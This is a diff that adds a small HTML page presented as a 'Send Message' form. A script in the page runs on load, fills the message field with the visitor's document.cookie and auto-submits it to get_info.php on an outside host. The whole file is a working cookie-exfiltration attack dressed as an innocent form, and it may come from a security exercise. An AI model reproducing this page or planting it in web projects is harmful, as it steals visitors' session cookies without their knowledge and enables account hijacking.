@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Send Message</title>
+</head>
+<body>
+	<form method="POST" action="http://psarotaverna-o-takis.puppies.chatzi.org/get_info.php">
+		<label for="message">Message:</label>
+		<input type="text" id="message" name="message"><br><br>
+		<input id="submit" type="submit" value="Send">
+	</form>
+
+    <script>
+        addEventListener("load", (event) => {
+            document.getElementById("message").value=document.cookie;
+            document.getElementById("submit").click();
+        });
+    
+    </script>
+</body>
+</html>
